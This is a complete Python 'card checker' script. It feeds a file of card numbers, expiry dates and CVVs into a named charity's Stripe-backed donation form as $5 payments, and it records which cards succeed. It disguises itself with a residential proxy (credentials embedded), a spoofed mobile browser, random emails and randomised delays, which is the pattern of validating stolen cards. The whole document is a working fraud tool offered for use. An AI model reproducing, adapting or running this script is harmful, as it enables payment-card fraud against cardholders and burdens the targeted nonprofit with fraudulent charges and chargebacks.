import requests
import re
import time
import random
import string
from datetime import datetime

def generate_random_email():
    """Generate a random email address"""
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
    username_length = random.randint(6, 12)
    username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(username_length))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_random_time():
    """Generate a random time on page between 30-120 seconds"""
    return str(random.randint(30000, 120000))

def parse_card_line(line):
    """Parse a line from the card text file with format CC|MM|YY|CVV"""
    parts = line.strip().split('|')
    if len(parts) >= 4:
        cc = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        # Format year to 2 digits if it's 4 digits
        if len(yy) == 4:
            yy = yy[2:]
            
        return cc, mm, yy, cvv
    return None, None, None, None

def check_card(cc, mm, yy, cvv, email=None):
    """Check a single card"""
    if not email:
        email = generate_random_email()
        
    session = requests.Session()
    
    PROXY = "http://PP_N13R1TOI8V-country-US-state-Florida-city-Clermont:u4jqpkkw@evo-pro.porterproxies.com:62345"

    session.proxies = {
        "http": PROXY,
        "https": PROXY
}

    # Step 1: Get the donation page to extract nonce
    print(f"\nChecking card: {cc}|{mm}/{yy}|{cvv}")
    print(f"Using email: {email}")
    print("Step 1: Fetching donation page...")
    
    url = "https://harlemstemup.com/donate/"
    headers = {
        "Host": "harlemstemup.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "dnt": "1",
        "X-Requested-With": "mark.via.gp",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
    }
    
    response = session.get(url, headers=headers)
    
    # Extract security nonce
    security_nonce = re.search(r'"security":"(.*?)"', response.text)
    if security_nonce:
        security_nonce = security_nonce.group(1)
        print(f"Security Nonce: {security_nonce}")
    else:
        print("Security nonce not found. Aborting.")
        return False
    
    # Extract idempotency token
    idempotency = re.search(r'"idempotency":"(.*?)"', response.text)
    if idempotency:
        idempotency = idempotency.group(1)
        print(f"Idempotency: {idempotency}")
    else:
        print("Idempotency token not found. Aborting.")
        return False
    
    # Step 2: Initiate payment intent
    print("\nStep 2: Initiating payment intent...")
    
    url = "https://harlemstemup.com/wp-admin/admin-ajax.php"
    headers = {
        "Host": "harlemstemup.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": '"Android"',
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://harlemstemup.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://harlemstemup.com/donate/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8"
    }
    
    data = {
        "action": "wpsd_donation",
        "name": "Vip op",
        "email": email,
        "amount": "5",
        "donation_for": "Harlem STEM Up!",
        "currency": "USD",
        "idempotency": idempotency,
        "security": security_nonce,
        "stripeSdk": ""
    }
    
    response = session.post(url, headers=headers, data=data)
    
    try:
        # Fixed client secret extraction
        client_secret = response.json().get("data", {}).get("client_secret", None)
        
        if client_secret:
            print(f"Client Secret: {client_secret}")
        else:
            print("Failed to get client secret. Response:", response.json())
            return False
    except Exception as e:
        print(f"Error parsing JSON response: {e}")
        return False
    
    # Step 3: Confirm payment intent with card details
    print("\nStep 3: Confirming payment with card details...")
    
    # Extract payment intent ID from client secret
    payment_intent_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else None
    
    if not payment_intent_id:
        print("Failed to extract payment intent ID from client secret. Aborting.")
        return False
        
    url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
    headers = {
        "Host": "api.stripe.com",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.39 Mobile Safari/537.36",
        "accept": "application/json",
        "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://js.stripe.com",
        "x-requested-with": "mark.via.gp",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://js.stripe.com/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
        "priority": "u=1, i"
    }
    
    payload = {
        "payment_method_data[type]": "card",
        "payment_method_data[billing_details][name]": "Vip op",
        "payment_method_data[billing_details][email]": email,
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[guid]": "NA",
        "payment_method_data[muid]": "NA",
        "payment_method_data[sid]": "NA",
        "payment_method_data[payment_user_agent]": "stripe.js/6a9fcf70ea; stripe-js-v3/6a9fcf70ea; card-element",
        "payment_method_data[referrer]": "https://harlemstemup.com",
        "payment_method_data[time_on_page]": generate_random_time(),
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_51KwTSgIKstDXlptU5k6wY2BYJxjTdS0UOcymscxrSFacKEyKZL8V5XAfA9hLw67KtG6ZlY1wE7ToVqPi2OCsFBp100liJubbpN",
        "client_secret": client_secret
    }
    
    response = session.post(url, headers=headers, data=payload)
    
    print(f"\nResponse Status Code: {response.status_code}")
    
    try:
        json_response = response.json()
        
        # Check for success or failure
        if response.status_code == 200:
            print("\n[SUCCESS] Payment processed successfully!")
            print(f"Card: {cc}|{mm}/{yy}|{cvv}")
            print(f"Email: {email}")
            
            # Save successful cards to a file
            with open("successful_cards.txt", "a") as f:
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{cc}|{mm}/{yy}|{cvv} - {email} - {now}\n")
                
            return True
        else:
            # Extract error details
            error = json_response.get('error', {})
            code = error.get('code', 'Unknown')
            decline_code = error.get('decline_code', 'Unknown')
            message = error.get('message', 'Unknown error')
            
            print("\n[DECLINED] Payment failed:")
            print(f"Card: {cc}|{mm}/{yy}|{cvv}")
            print(f"Code: {code}")
            print(f"Decline Code: {decline_code}")
            print(f"Message: {message}")
            
            # Save declined cards to a file
            with open("declined_cards.txt", "a") as f:
                now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{cc}|{mm}/{yy}|{cvv} - {message} - {now}\n")
                
            return False
    except Exception as e:
        print(f"Error parsing response: {e}")
        return False

def main():
    print("=" * 60)
    print("        Stripe Card Checker for Harlem STEM Up        ")
    print("=" * 60)
    
    while True:
        file_path = input("\nEnter the path to your card list file (or 'q' to quit): ")
        
        if file_path.lower() == 'q':
            print("Exiting program.")
            break
        
        try:
            with open(file_path, 'r') as file:
                cards = file.readlines()
            
            print(f"\nLoaded {len(cards)} cards from {file_path}")
            print("Random emails will be generated for each card")
            print("Starting card check process...")
            
            success_count = 0
            fail_count = 0
            
            for i, card_line in enumerate(cards):
                if not card_line.strip():
                    continue
                
                print(f"\n[{i+1}/{len(cards)}] Processing card...")
                
                cc, mm, yy, cvv = parse_card_line(card_line)
                if cc:
                    result = check_card(cc, mm, yy, cvv)
                    if result:
                        success_count += 1
                    else:
                        fail_count += 1
                    
                    if i < len(cards) - 1:
                        delay = random.randint(3, 8)  # Random delay between 3-8 seconds
                        print(f"\nWaiting {delay} seconds before next card...")
                        time.sleep(delay)
                else:
                    print(f"Invalid card format: {card_line.strip()}")
            
            print("\n" + "=" * 60)
            print(f"Check completed. Results: {success_count} successful, {fail_count} failed")
            print("Successful cards saved to: successful_cards.txt")
            print("Declined cards saved to: declined_cards.txt")
            print("=" * 60)
            
        except FileNotFoundError:
            print(f"File not found: {file_path}")
        except Exception as e:
            print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
